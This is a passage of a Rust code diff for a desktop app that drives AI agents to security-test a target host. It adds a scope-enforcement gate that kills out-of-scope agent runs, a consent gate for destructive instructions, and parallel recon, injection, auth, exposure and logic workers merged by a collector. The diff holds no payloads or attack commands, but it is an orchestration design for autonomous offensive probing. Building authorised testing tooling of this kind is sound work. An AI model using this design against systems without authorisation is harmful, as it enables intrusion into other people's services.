+/// 반응형 스코프 게이트 — prime-agent 엔진용. tool_execution_start 를 볼 때마다
+/// 인가를 판정하고, 위반이면 레지스트리의 자식을 즉시 kill 한다.
+#[derive(Clone)]
+struct ScopeEnforce {
+    proc_key: String,
+    auth: auth::AuthList,
+}
+
+/// 어시스턴트 텍스트 1건 확정 — 중복 노트 방지 + outcome 누적 + 전송.
+fn flush_assistant_text(
+    app: &AppHandle,
+    id: &str,
+    t: &str,
+    worker: Option<&WorkerTag>,
+    outcome: &mut PumpOutcome,
+    last_text: &mut Option<String>,
+) {
+    let t = t.trim().to_string();
+    if t.is_empty() || last_text.as_deref() == Some(t.as_str()) {
+        return;
     }
+    if !outcome.text.is_empty() {
+        outcome.text.push_str("\n\n");
+    }
+    outcome.text.push_str(&t);
+    emit_note(app, id, t.clone(), worker);
+    *last_text = Some(t);
+}
 
-    // stdout → pi json 이벤트 스트림: text_delta 를 모아 text_end 에서 노트로,
-    // tool_use 는 [pi-툴] 표시, 종료 시 상태 마감.
-    {
+/// tool_execution_end.result → 한 줄 요약 (content 첫 텍스트 우선, 없으면 details).
+fn tool_result_summary(ev: &Value) -> String {
+    let r = ev.get("result");
+    let txt = r
+        .and_then(|r| r.get("content"))
+        .and_then(|c| c.as_array())
+        .and_then(|a| {
+            a.iter()
+                .find_map(|p| p.get("text").and_then(|t| t.as_str()).map(|s| s.to_string()))
+        })
+        .or_else(|| {
+            r.and_then(|r| r.get("details")).map(|d| {
+                if let Some(s) = d.as_str() {
+                    s.to_string()
+                } else {
+                    d.to_string()
+                }
+            })
+        })
+        .unwrap_or_default();
+    let t = txt.split_whitespace().collect::<Vec<_>>().join(" ");
+    let t: String = t.chars().take(160).collect();
+    if t.is_empty() {
+        String::new()
+    } else {
+        format!(" — {t}")
+    }
+}
+
+/// pi/prime-agent json 이벤트 스트림 펌프 — stdout 은 인라인, stderr 는 내부 스레드.
+/// pi 1.3.0 json 프로토콜(docs/json.md) 기준 (prime-agent 0.10 실측 동일):
+///   text_delta/text_end + tool_execution_start/end + message_end(stopReason) + agent_settled.
+///   최상위 {"type":"error"} 이벤트는 존재하지 않는다 — 실패는 message_end 의
+///   stopReason=error|aborted + errorMessage, stderr, exit 코드로 판단한다.
+/// `tool_prefix` 는 툴 노트 표시 ("pi-툴" | "prime-툴"). `enforce` 가 있으면
+/// tool_execution_start 마다 scope 를 판정하고 위반 시 자식을 kill 한다.
+fn pump_pi_stdio(
+    app: &AppHandle,
+    id: &str,
+    pipes: PiPipes,
+    worker: Option<WorkerTag>,
+    tool_prefix: &str,
+    enforce: Option<ScopeEnforce>,
+) -> PumpOutcome {
+    let PiPipes { out, err } = pipes;
+    // stderr → [sys] 노트(모델/스코프 로그·print 모드 오류).
+    let err_handle = {
         let app = app.clone();
         let id = id.to_string();
+        let worker = worker.clone();
         thread::spawn(move || {
-            let mut buf = String::new();
-            let mut last_text: Option<String> = None; // text_end/message_end 중복 노트 방지
-            for line in BufReader::new(stdout).lines().map_while(Result::ok) {
+            for line in err.lines().map_while(Result::ok) {
                 let line = line.trim();
                 if line.is_empty() {
                     continue;
                 }
-                let ev: Value = serde_json::from_str(line).unwrap_or_else(|_| json!({ "raw": line }));
-                let ty = ev.get("type").and_then(|t| t.as_str()).unwrap_or("");
-                if ty == "tool_execution_start" {
-                    let name = ev.get("toolName").and_then(|n| n.as_str()).unwrap_or("tool");
-                    let a = ev.get("args").map(|v| v.to_string()).unwrap_or_default();
-                    let a = a.chars().take(120).collect::<String>();
-                    let ev2 = json!({ "type": "note", "text": format!("[pi-툴] {name} {a}") });
-                    let stamped = append_event(&app, &id, &ev2);
-                    app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
-                } else if ty == "message_update" {
-                    if let Some(ae) = ev.get("assistantMessageEvent") {
-                        match ae.get("type").and_then(|t| t.as_str()) {
-                            Some("text_delta") => {
-                                if let Some(d) = ae.get("delta").and_then(|d| d.as_str()) {
-                                    buf.push_str(d);
-                                }
-                            }
-                            Some("text_end") => {
-                                let t = buf.trim().to_string();
-                                if !t.is_empty() && last_text.as_deref() != Some(t.as_str()) {
-                                    let ev2 = json!({ "type": "note", "text": t.clone() });
-                                    let stamped = append_event(&app, &id, &ev2);
-                                    app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
-                                    last_text = Some(t);
-                                }
-                                buf.clear();
-                            }
-                            _ => {}
+                emit_note(&app, &id, format!("[sys] {line}"), worker.as_ref());
+            }
+        })
+    };
+
+    let mut outcome = PumpOutcome {
+        text: String::new(),
+        failed: false,
+        aborted: false,
+        settled: false,
+        blocked: false,
+    };
+    let mut buf = String::new();
+    let mut last_text: Option<String> = None; // text_end/message_end 중복 노트 방지
+    for line in out.lines().map_while(Result::ok) {
+        let line = line.trim();
+        if line.is_empty() {
+            continue;
+        }
+        let ev: Value = serde_json::from_str(line).unwrap_or_else(|_| json!({ "raw": line }));
+        let ty = ev.get("type").and_then(|t| t.as_str()).unwrap_or("");
+        match ty {
+            "tool_execution_start" => {
+                let name = ev.get("toolName").and_then(|n| n.as_str()).unwrap_or("tool");
+                let args_val = ev.get("args").cloned().unwrap_or(Value::Null);
+                let a = args_val.to_string();
+                let a = a.chars().take(120).collect::<String>();
+                emit_note(app, id, format!("[{tool_prefix}] {name} {a}"), worker.as_ref());
+                // 반응형 스코프 게이트 (prime-agent 엔진): 위반이면 즉시 kill.
+                if let Some(enf) = enforce.as_ref() {
+                    if !outcome.blocked {
+                        if let Some(reason) = decide_tool_violation(&enf.auth, name, &args_val) {
+                            let killed = app
+                                .state::<Procs>()
+                                .0
+                                .lock()
+                                .unwrap()
+                                .get_mut(&enf.proc_key)
+                                .map(|c| c.kill().is_ok())
+                                .unwrap_or(false);
+                            outcome.failed = true;
+                            outcome.blocked = true;
+                            emit_note(
+                                app,
+                                id,
+                                format!("[차단] {reason} (프로세스 중단{}).", if killed { "됨" } else { " 시도" }),
+                                worker.as_ref(),
+                            );
                         }
                     }
-                } else if ty == "message_end" {
-                    if let Some(m) = ev.get("message") {
-                        if m.get("role").and_then(|r| r.as_str()) == Some("assistant") {
-                            if let Some(content) = m.get("content").and_then(|c| c.as_array()) {
-                                for part in content {
-                                    if part.get("type").and_then(|t| t.as_str()) == Some("text") {
-                                        if let Some(t) = part.get("text").and_then(|t| t.as_str()) {
-                                            let t = t.trim().to_string();
-                                            if !t.is_empty() && last_text.as_deref() != Some(t.as_str()) {
-                                                let ev2 = json!({ "type": "note", "text": t.clone() });
-                                                let stamped = append_event(&app, &id, &ev2);
-                                                app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
-                                                last_text = Some(t);
-                                            }
-                                        }
+                }
+            }
+            "tool_execution_end" => {
+                let name = ev.get("toolName").and_then(|n| n.as_str()).unwrap_or("tool");
+                let is_err = ev.get("isError").and_then(|v| v.as_bool()).unwrap_or(false);
+                let dur = ev
+                    .get("durationMs")
+                    .and_then(|v| v.as_u64())
+                    .map(|ms| format!(" {ms}ms"))
+                    .unwrap_or_default();
+                let summary = tool_result_summary(&ev);
+                let mark = if is_err { "✗" } else { "✓" };
+                emit_note(app, id, format!("[{tool_prefix}{mark}] {name}{dur}{summary}"), worker.as_ref());
+            }
+            "message_update" => {
+                if let Some(ae) = ev.get("assistantMessageEvent") {
+                    match ae.get("type").and_then(|t| t.as_str()) {
+                        Some("text_delta") => {
+                            if let Some(d) = ae.get("delta").and_then(|d| d.as_str()) {
+                                buf.push_str(d);
+                            }
+                        }
+                        Some("text_end") => {
+                            let b = buf.clone();
+                            flush_assistant_text(app, id, &b, worker.as_ref(), &mut outcome, &mut last_text);
+                            buf.clear();
+                        }
+                        _ => {}
+                    }
+                }
+            }
+            "message_end" => {
+                if let Some(m) = ev.get("message") {
+                    match m.get("stopReason").and_then(|r| r.as_str()) {
+                        Some("error") => {
+                            outcome.failed = true;
+                            let msg = m
+                                .get("errorMessage")
+                                .and_then(|e| e.as_str())
+                                .unwrap_or("pi 요청 실패")
+                                .to_string();
+                            emit_note(app, id, format!("[오류] {msg}"), worker.as_ref());
+                        }
+                        Some("aborted") => {
+                            outcome.aborted = true;
+                            emit_note(app, id, "[중지] pi 실행이 중단됐습니다.".to_string(), worker.as_ref());
+                        }
+                        _ => {}
+                    }
+                    if m.get("role").and_then(|r| r.as_str()) == Some("assistant") {
+                        if let Some(content) = m.get("content").and_then(|c| c.as_array()) {
+                            for part in content {
+                                if part.get("type").and_then(|t| t.as_str()) == Some("text") {
+                                    if let Some(t) = part.get("text").and_then(|t| t.as_str()) {
+                                        flush_assistant_text(app, id, t, worker.as_ref(), &mut outcome, &mut last_text);
                                     }
                                 }
                             }
                         }
                     }
-                } else if ty == "error" {
-                    let text = ev.get("error").and_then(|e| e.as_str()).unwrap_or("pi 오류").to_string();
-                    let ev2 = json!({ "type": "note", "text": format!("[오류] {text}") });
-                    let stamped = append_event(&app, &id, &ev2);
-                    app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
                 }
             }
-            if !buf.trim().is_empty() {
-                let ev2 = json!({ "type": "note", "text": buf.trim().to_string() });
-                let stamped = append_event(&app, &id, &ev2);
-                app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
-            }
-            let removed = app.state::<Procs>().0.lock().unwrap().remove(&id);
-            if let Some(mut c) = removed {
-                let ok = c.wait().map(|st| st.success()).unwrap_or(false);
-                let ev2 = json!({ "type": "note", "text": if ok { "[완료] prime-agent 종료.".to_string() } else { "[완료] prime-agent 비정상 종료(exit≠0).".to_string() } });
-                let stamped = append_event(&app, &id, &ev2);
-                app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
-                if let Some(cur) = read_session(&app, &id) {
-                    if cur.status == "running" {
-                        let st = if ok { "done" } else { "error" };
-                        set_status(&app, &id, st);
-                        app.emit("engagement-status", json!({ "sessionId": id, "status": st })).ok();
-                    }
+            "agent_settled" => {
+                outcome.settled = true;
+                if ev.get("aborted").and_then(|v| v.as_bool()).unwrap_or(false) {
+                    outcome.aborted = true;
+                    emit_note(app, id, "[중지] pi settled(aborted).".to_string(), worker.as_ref());
                 }
             }
-        });
+            "error" => {
+                // 레거시 폴백 — 현 프로토콜에 최상위 error 는 없지만 무시하지 않는다.
+                outcome.failed = true;
+                let text = ev.get("error").and_then(|e| e.as_str()).unwrap_or("pi 오류").to_string();
+                emit_note(app, id, format!("[오류] {text}"), worker.as_ref());
+            }
+            _ => {}
+        }
     }
-    Ok(())
+    if !buf.trim().is_empty() {
+        let b = buf.clone();
+        flush_assistant_text(app, id, &b, worker.as_ref(), &mut outcome, &mut last_text);
+    }
+    let _ = err_handle.join();
+    outcome
 }
 
-#[tauri::command]
-fn start_engagement(app: AppHandle, id: String) -> Result<(), String> {
-    let s = read_session(&app, &id).ok_or("세션을 찾을 수 없습니다")?;
+/// 실행 전 공통 검증 — 세션/프로바이더/실행중복/redcell 경로.
+fn engagement_precheck(app: &AppHandle, id: &str) -> Result<(Session, Settings, String, String), String> {
+    let s = read_session(app, id).ok_or("세션을 찾을 수 없습니다")?;
     // 프로바이더 설정 없으면 거부 — mock 은 제거됨(데스크톱은 명시적 설정만).
     let provider = s.provider.trim();
     if provider.is_empty() || provider == "mock" {
@@ -1254,31 +2277,434 @@ fn start_engagement(app: AppHandle, id: String) -> Result<(), String> {
     }
     let provider = provider.to_string();
     // 앱이 죽었다 다시 켜진 경우 등: 상태가 running 이어도 실제 실행 프로세스가 없으면
-    // 재실행을 허용한다(레지스트리 기준 — 스트림 종료 시 항목이 제거되므로 정확하다).
-    let truly_running = app.state::<Procs>().0.lock().unwrap().contains_key(&id);
+    // 재실행을 허용한다(레지스트리 기준 — 워커 키 `{id}#w{n}` 포함).
+    let truly_running = app
+        .state::<Procs>()
+        .0
+        .lock()
+        .unwrap()
+        .keys()
+        .any(|k| k == id || k.starts_with(&format!("{id}#")));
     if s.status == "running" && truly_running {
         return Err("이미 실행 중인 세션입니다".into());
     }
     let settings = get_settings(app.clone());
     let redcell = settings.redcell_dir.clone();
-    if redcell.trim().is_empty() || !Path::new(&redcell).join("src/cli.ts").exists() {
+    // redcell 경로(-e 확장 로드용)는 pi 엔진에서만 필수. prime-agent 는 스킬 주입이라 불필요.
+    if session_engine(&s) == Engine::Pi
+        && (redcell.trim().is_empty() || !Path::new(&redcell).join("src/cli.ts").exists())
+    {
         return Err(format!(
             "redcell 경로를 찾을 수 없습니다: '{redcell}'. 설정(⚙)에서 redcell_dir 을 지정하세요."
         ));
     }
-
-    // 이 앱은 **prime-agent(pi) 전용 셸**이다 — 대상 URL/호스트를 위에 넣고, 우측 패널에서
-    // 지시를 내리면 pi 가 대화를 이어가며 수행한다(해킹 전용 엔진 분기는 사용하지 않는다 —
-    // 범용 지시가 더 잘 동작하므로). 인가 확장은 -e 로 명시 로드된다.
-    return run_prime(&app, &id, &s, &settings, &redcell, &provider);
+    Ok((s, settings, redcell, provider))
 }
-/// 실행 중지 — 등록된 redcell 자식 프로세스를 kill 하고 상태를 stopped 로 마감한다.
+
+/// P0 스윕 실행 + 증거 저장 + 상태 이벤트 — 심층/단일 진단 공용.
+/// 스윕 실패(대상 다운 등)해도 빈 증거로 계속 진행한다 (LLM 자체 정찰로 보완).
+fn run_p0_sweep(app: &AppHandle, id: &str, host: &str, port: Option<u16>, cookie: &str, danger: bool) -> probes::ProbeReport {
+    let ev = json!({ "type": "worker_status", "worker": "p0", "label": "P0·스윕", "title": "자동 스윕", "state": "running" });
+    let stamped = append_event(app, id, &ev);
+    app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
+    if danger {
+        let ev = json!({ "type": "note", "text": "[경고] P0 파괴적 프로브 실행 — 기본자격·IDOR 인접·쓰기 검증 (사용자 동의 기반)" });
+        let stamped = append_event(app, id, &ev);
+        app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
+    }
+    let mut cfg = probes::SweepConfig::default();
+    if !cookie.trim().is_empty() {
+        cfg.cookie = Some(cookie.trim().to_string());
+    }
+    cfg.danger = danger;
+    let rep = probes::run_sweep_with_config(host, port, cfg);
+    // 증거 전문 저장 (세션당 최신 1건).
+    {
+        let guard = app.state::<IoGuard>();
+        let _lock = guard.0.lock().unwrap();
+        let p = sessions_dir(app).join(format!("probe-{id}.json"));
+        if let Ok(txt) = serde_json::to_string_pretty(&rep) {
+            fs::write(p, txt).ok();
+        }
+    }
+    let line = probes::sweep_summary_line(&rep);
+    let ev = json!({ "type": "note", "text": line });
+    let stamped = append_event(app, id, &ev);
+    app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
+    let ev = json!({ "type": "worker_status", "worker": "p0", "label": "P0·스윕", "title": "자동 스윕", "state": "done" });
+    let stamped = append_event(app, id, &ev);
+    app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
+    rep
+}
+
+/// P0 증거 주입 블록 — 워커/collector/단일 진단 지시문 끝에 덧붙인다.
+fn p0_evidence_block(rep: &probes::ProbeReport, cap_chars: usize) -> String {
+    format!(
+        "\n\n## P0 자동 스윕 증거 (실측 확정 — ID 인용 필수)\n{}\n규칙: 위 [P-###] 증거는 확정 실측이다. 관련 시나리오에 ID를 반드시 인용하고, 이미 커버된 항목은 재프로브하지 말고 체인·악용 추론과 빈틈 보완에 집중하라.",
+        probes::evidence_digest(rep, cap_chars)
+    )
+}
+
+/// pi 연속대화 세션 id 보장 (run_prime·deep 공용).
+fn ensure_piq(app: &AppHandle, s: &Session) -> Session {
+    if !s.piq.trim().is_empty() {
+        return s.clone();
+    }
+    let mut s2 = s.clone();
+    let id8 = s2.id.chars().take(8).collect::<String>();
+    s2.piq = format!("rc-{id8}");
+    write_session_locked(app, &s2);
+    s2
+}
+
+/// 대상 URL 조합 (포트 → http/https).
+fn target_url(host: &str, port: Option<u16>) -> String {
+    match port {
+        Some(p) if p == 443 || p == 8443 => format!("https://{host}/"),
+        Some(p) => format!("http://{host}:{p}/"),
+        None => format!("http://{host}/"),
+    }
+}
+
+fn https_hint_for(host: &str, port: Option<u16>) -> String {
+    match port {
+        Some(p) if p != 443 && p != 8443 => {
+            format!("https://{host}:{p}/ 로도 접속을 시도해볼 것(둘 다 확인).")
+        }
+        _ => String::new(),
+    }
+}
+
+/// 심층 진단 — 워커 5개를 독립 pi 세션으로 동시에 실행한 뒤 collector 가 병합.
+/// prime-agent builder(factory) 패턴의 RedCell 구현: 병렬 섹션 작성자 + fan-in 병합.
+/// 즉시 반환하며, 진행은 `engagement-event`(worker_status·노트)/`engagement-status` 로 전달된다.
+#[tauri::command]
+fn start_deep_diagnosis(app: AppHandle, id: String) -> Result<(), String> {
+    let (s, settings, redcell, provider) = engagement_precheck(&app, &id)?;
+    if s.host.trim().is_empty() {
+        return Err("심층 진단은 대상 host/URL 이 필요합니다 — 위에 URL 을 입력하세요.".into());
+    }
+    gate_session_instruction(&app, &id, &s)?;
+    // 심층 플래그 확정 (결과 탭이 진단 리포트로 렌더되도록 diag 도 함께).
+    {
+        let guard = app.state::<IoGuard>();
+        let _lock = guard.0.lock().unwrap();
+        let p = session_file(&app, &id);
+        if let Some(mut cur) = fs::read_to_string(&p)
+            .ok()
+            .and_then(|t| serde_json::from_str::<Session>(&t).ok())
+        {
+            cur.deep = true;
+            cur.diag = true;
+            cur.updated_at = now();
+            if let Ok(txt) = serde_json::to_string_pretty(&cur) {
+                fs::write(p, txt).ok();
+            }
+        }
+    }
+    let s = ensure_piq(&app, &s);
+    let piq = s.piq.clone();
+    let target = target_url(&s.host, s.port);
+    let https_hint = https_hint_for(&s.host, s.port);
+    let goal = if s.goal.trim().is_empty() {
+        "이 서비스의 보안 진단 리포트를 작성해줘.".to_string()
+    } else {
+        s.goal.trim().to_string()
+    };
+    let mem = memory_block(&app, &s.host);
+    let engine = session_engine(&s);
+    let engine_label = if engine == Engine::Prime { "prime-agent" } else { "pi" };
+    // 동기 프리플라이트 — 엔진 바이너리 미설치면 즉시 Err.
+    if engine == Engine::Prime {
+        prime_agent_path()?;
+    } else {
+        prime_cli_path(&redcell)?;
+    }
+
+    set_status(&app, &id, "running");
+    app.emit("engagement-status", json!({ "sessionId": id, "status": "running" })).ok();
+    {
+        let ev = json!({ "type": "note", "text": format!("[sys] 심층 진단 시작({engine_label}) — 5개 분야 워커를 동시에 실행합니다(정찰·주입·인증·노출·로직).") });
+        let stamped = append_event(&app, &id, &ev);
+        app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
+    }
+
+    thread::spawn(move || {
+        // P0: 결정적 대량 스윕을 먼저 실행하고 증거를 워커·collector 에게 나눠준다.
+        let sweep = run_p0_sweep(&app, &id, &s.host, s.port, &s.auth_cookie, s.danger_consent);
+        let digest_w = p0_evidence_block(&sweep, 6000);
+        let digest_c = p0_evidence_block(&sweep, 12000);
+        // 워커 1라운드 실행 클로저 — round 0 = 초동, 1+ = 추적 (동일 세션 연속).
+        let run_round = |round: u32, ctx: &std::collections::HashMap<String, (String, String)>| -> Vec<(String, PumpOutcome)> {
+            for def in DEEP_WORKERS {
+                let ev = json!({ "type": "worker_status", "worker": def.id, "title": def.title, "label": def.label, "state": "running" });
+                let stamped = append_event(&app, &id, &ev);
+                app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
+            }
+            let mut handles = Vec::new();
+            for def in DEEP_WORKERS {
+                let app = app.clone();
+                let id = id.clone();
+                let settings = settings.clone();
+                let redcell = redcell.clone();
+                let provider = provider.clone();
+                let piq = piq.clone();
+                let target = target.clone();
+                let goal = goal.clone();
+                let https_hint = https_hint.clone();
+                let mem = mem.clone();
+                let digest_w = digest_w.clone();
+                let (own_prior, cross) = ctx.get(def.id).cloned().unwrap_or_default();
+                handles.push(thread::spawn(move || -> (String, PumpOutcome) {
+                    let tag = WorkerTag { id: def.id.to_string(), label: def.label.to_string() };
+                    let mut instruction = if round == 0 {
+                        let mut i = deep_worker_instruction(def, &target, &goal, &https_hint, &mem);
+                        i.push_str(&digest_w);
+                        i
+                    } else {
+                        deep_followup_instruction(def, round + 1, &own_prior, &cross, &target)
+                    };
+                    if engine == Engine::Prime {
+                        instruction = prime_adapt(instruction);
+                    }
+                    // 라운드가 바뀌어도 세션은 유지 (pi session-id / prime session-dir 연속).
+                    let run_tag = if engine == Engine::Prime { def.id.to_string() } else { format!("{piq}-{}", def.id) };
+                    let key = format!("{id}#{}", def.id);
+                    let outcome = match prepare_engine_run(&app, &id, engine, &settings, &provider, &redcell, &run_tag, instruction) {
+                        Ok(prep) => match spawn_prepared(&prep, &provider, &settings) {
+                            Ok((child, pipes)) => {
+                                app.state::<Procs>().0.lock().unwrap().insert(key.clone(), child);
+                                pump_and_wait(&app, &id, &key, pipes, Some(tag.clone()), prep.tool_prefix, prep.enforce_auth)
+                            }
+                            Err(e) => {
+                                emit_note(&app, &id, format!("[오류] {e}"), Some(&tag));
+                                PumpOutcome { text: String::new(), failed: true, aborted: false, settled: false, blocked: false }
+                            }
+                        },
+                        Err(e) => {
+                            emit_note(&app, &id, format!("[오류] {e}"), Some(&tag));
+                            PumpOutcome { text: String::new(), failed: true, aborted: false, settled: false, blocked: false }
+                        },
+                    };
+                    let state = if outcome.aborted { "stopped" } else if outcome.failed { "error" } else { "done" };
+                    let ev = json!({ "type": "worker_status", "worker": def.id, "title": def.title, "label": def.label, "state": state });
+                    let stamped = append_event(&app, &id, &ev);
+                    app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
+                    (def.id.to_string(), outcome)
+                }));
+            }
+            let mut out: Vec<(String, PumpOutcome)> = handles
+                .into_iter()
+                .map(|h| {
+                    h.join().unwrap_or_else(|_| {
+                        ("w?".into(), PumpOutcome { text: String::new(), failed: true, aborted: false, settled: false, blocked: false })
+                    })
+                })
+                .collect();
+            out.sort_by(|a, b| a.0.cmp(&b.0));
+            out
+        };
+        let is_stopped = |results: &[(String, PumpOutcome)]| -> bool {
+            read_session(&app, &id).map(|s| s.status == "stopped").unwrap_or(false)
+                || results.iter().any(|(_, o)| o.aborted)
+        };
+        // agentic loop — 1차 → (신규 발견이 있으면) 추적 라운드, 수렴 시 조기 종료.
+        let mut accum: std::collections::HashMap<String, String> = std::collections::HashMap::new();
+        let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
+        let mut results = run_round(0, &std::collections::HashMap::new());
+        for (wid, o) in &results {
+            if !o.failed {
+                accum.insert(wid.clone(), o.text.clone());
+                for k in extract_finding_keys(&o.text) {
+                    seen.insert(k);
+                }
+            }
+        }
+        let mut rounds_run: u32 = 1;
+        for round in 1..DEEP_MAX_ROUNDS {
+            if is_stopped(&results) {
+                break;
+            }
+            // 추적 컨텍스트 — 자가 누적 + 타 워커 신규 키 (교차 단서).
+            let mut ctx: std::collections::HashMap<String, (String, String)> = std::collections::HashMap::new();
+            let mut leads = 0usize;
+            for def in DEEP_WORKERS {
+                let own = accum.get(def.id).cloned().unwrap_or_default();
+                let mut cross_lines: Vec<String> = Vec::new();
+                for (wid, o) in &results {
+                    if wid == def.id || o.failed {
+                        continue;
+                    }
+                    for k in extract_finding_keys(&o.text) {
+                        if seen.contains(&k) {
+                            continue;
+                        }
+                        cross_lines.push(format!("- [단서:{wid}] {k}"));
+                        if cross_lines.len() >= 6 {
+                            break;
+                        }
+                    }
+                    if cross_lines.len() >= 6 {
+                        break;
+                    }
+                }
+                leads += cross_lines.len();
+                ctx.insert(def.id.to_string(), (own, cross_lines.join("\n")));
+            }
+            {
+                let ev = json!({ "type": "note", "text": format!("[sys] 추적 라운드 {} 시작 — 교차 단서 {leads}건 추적.", round + 1) });
+                let stamped = append_event(&app, &id, &ev);
+                app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
+            }
+            results = run_round(round, &ctx);
+            rounds_run += 1;
+            let mut new_n = 0usize;
+            for (wid, o) in &results {
+                if o.failed {
+                    continue;
+                }
+                for k in extract_finding_keys(&o.text) {
+                    if seen.insert(k) {
+                        new_n += 1;
+                    }
+                }
+                accum.entry(wid.clone()).or_default().push_str(&format!("\n\n--- 추적 라운드 {} ---\n{}", round + 1, o.text));
+            }
+            {
+                let ev = json!({ "type": "note", "text": format!("[sys] 추적 라운드 {} 종료 — 신규 발견 {new_n}건.", round + 1) });
+                let stamped = append_event(&app, &id, &ev);
+                app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
+            }
+            if new_n == 0 {
+                let ev = json!({ "type": "note", "text": "[sys] 수렴 — 추가 발견 없음, collector 로 진행합니다." });
+                let stamped = append_event(&app, &id, &ev);
+                app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
+                break;
+            }
+        }
+
+        // 중단됐으면 collector 없이 마감 (stop_engagement 가 이미 stopped 로 마감했다).
+        if is_stopped(&results) {
+            return;
+        }
+        // collector fan-in — 워커 발견(전 라운드 누적)을 시나리오 리포트로 병합.
+        let mut combined = String::new();
+        let mut ok_n = 0;
+        for def in DEEP_WORKERS {
+            let wid = def.id;
+            let body = accum.get(wid).map(|s| s.trim()).unwrap_or("");
+            if !body.is_empty() {
+                ok_n += 1;
+            }
+            let body = if body.is_empty() {
+                "(이 워커는 결과를 내지 못했습니다 — collector 가 해당 분야를 보강할 것)".to_string()
+            } else {
+                body.chars().take(6000).collect::<String>()
+            };
+            combined.push_str(&format!("\n\n--- {} ({wid}) [라운드 {rounds_run}] ---\n{body}", def.label));
+        }
+        {
+            let ev = json!({ "type": "note", "text": format!("[sys] 워커 {ok_n}/{} 완료({rounds_run}라운드) — collector 가 최종 시나리오 리포트를 병합합니다.", DEEP_WORKERS.len()) });
+            let stamped = append_event(&app, &id, &ev);
+            app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
+        }
+        let mut merge = deep_merge_instruction(&target, &goal, &combined, &mem);
+        if engine == Engine::Prime {
+            merge = prime_adapt(merge);
+        }
+        merge.push_str(&digest_c);
+        let run_tag = if engine == Engine::Prime { "merge".to_string() } else { format!("{piq}-merge") };
+        let merge_outcome = match prepare_engine_run(&app, &id, engine, &settings, &provider, &redcell, &run_tag, merge) {
+            Ok(prep) => match spawn_prepared(&prep, &provider, &settings) {
+                Ok((child, pipes)) => {
+                    app.state::<Procs>().0.lock().unwrap().insert(id.clone(), child);
+                    pump_and_wait(&app, &id, &id, pipes, None, prep.tool_prefix, prep.enforce_auth)
+                }
+                Err(e) => {
+                    emit_note(&app, &id, format!("[오류] collector 실행 실패: {e}"), None);
+                    PumpOutcome { text: String::new(), failed: true, aborted: false, settled: false, blocked: false }
+                }
+            },
+            Err(e) => {
+                emit_note(&app, &id, format!("[오류] collector 준비 실패: {e}"), None);
+                PumpOutcome { text: String::new(), failed: true, aborted: false, settled: false, blocked: false }
+            }
+        };
+        let ok = !merge_outcome.failed && !merge_outcome.aborted;
+        {
+            let ev = json!({ "type": "note", "text": if ok {
+                "[완료] 심층 진단 리포트 병합 완료 — 결과 탭에서 확인하세요.".to_string()
+            } else if merge_outcome.aborted {
+                "[중지] collector 가 중단됐습니다.".to_string()
+            } else {
+                "[완료] collector 비정상 종료 — 워커 발견은 라이브 캡처에 남아 있습니다.".to_string()
+            }});
+            let stamped = append_event(&app, &id, &ev);
+            app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
+        }
+        // harness 메모리(prime-agent 패턴): 진단 이력 1줄을 대상별로 누적.
+        record_history(&app, &s.host, ok_n, DEEP_WORKERS.len(), ok);
+        if let Some(cur) = read_session(&app, &id) {
+            if cur.status == "running" {
+                let st = if ok { "done" } else { "error" };
+                set_status(&app, &id, st);
+                app.emit("engagement-status", json!({ "sessionId": id, "status": st })).ok();
+            }
+        }
+    });
+    Ok(())
+}
+
+#[tauri::command]
+/// 파괴적 지시문 게이트 — 실행 진입점 공용. 미동의 파괴 지시는
+/// CONSENT_REQUIRED 에러로 막고, Caution 은 주의 노트만 남기고 진행한다.
+fn gate_session_instruction(app: &AppHandle, id: &str, s: &Session) -> Result<(), String> {
+    match risk::gate_instruction(&s.goal, s.danger_consent) {
+        Ok(rep) => {
+            if rep.level == risk::RiskLevel::Caution {
+                let titles: Vec<String> = rep.concerns.iter().map(|c| c.title.clone()).collect();
+                let ev = json!({ "type": "note", "text": format!("[sys] 주의: {} — {}", titles.join("·"), rep.summary) });
+                let stamped = append_event(app, id, &ev);
+                app.emit("engagement-event", json!({ "sessionId": id, "event": stamped })).ok();
+            }
+            Ok(())
+        }
+        Err(e) => Err(e),
+    }
+}
+
+#[tauri::command]
+fn start_engagement(app: AppHandle, id: String) -> Result<(), String> {
+    let (s, settings, redcell, provider) = engagement_precheck(&app, &id)?;
+    gate_session_instruction(&app, &id, &s)?;
+    // 세션 엔진에 따라 pi(-e 확장 게이트) 또는 prime-agent(스킬+킬게이트)로 실행한다.
+    // (심층 진단은 start_deep_diagnosis — 병렬 워커 + collector.)
+    return match session_engine(&s) {
+        Engine::Pi => run_prime(&app, &id, &s, &settings, &redcell, &provider),
+        Engine::Prime => run_prime_agent(&app, &id, &s, &settings, &provider),
+    };
+}
+/// 실행 중지 — 등록된 자식 프로세스(심층 워커 `{id}#w{n}` 포함)를 kill 하고 stopped 로 마감한다.
 #[tauri::command]
 fn stop_engagement(app: AppHandle, id: String) -> Result<(), String> {
-    let removed = app.state::<Procs>().0.lock().unwrap().remove(&id);
-    let mut child = removed.ok_or("실행 중인 세션이 아닙니다")?;
-    let _ = child.kill();
-    let _ = child.wait();
+    let keys: Vec<String> = {
+        let procs = app.state::<Procs>();
+        let reg = procs.0.lock().unwrap();
+        reg.keys()
+            .filter(|k| *k == &id || k.starts_with(&format!("{id}#")))
+            .cloned()
+            .collect()
+    };
+    if keys.is_empty() {
+        return Err("실행 중인 세션이 아닙니다".into());
+    }
+    for k in keys {
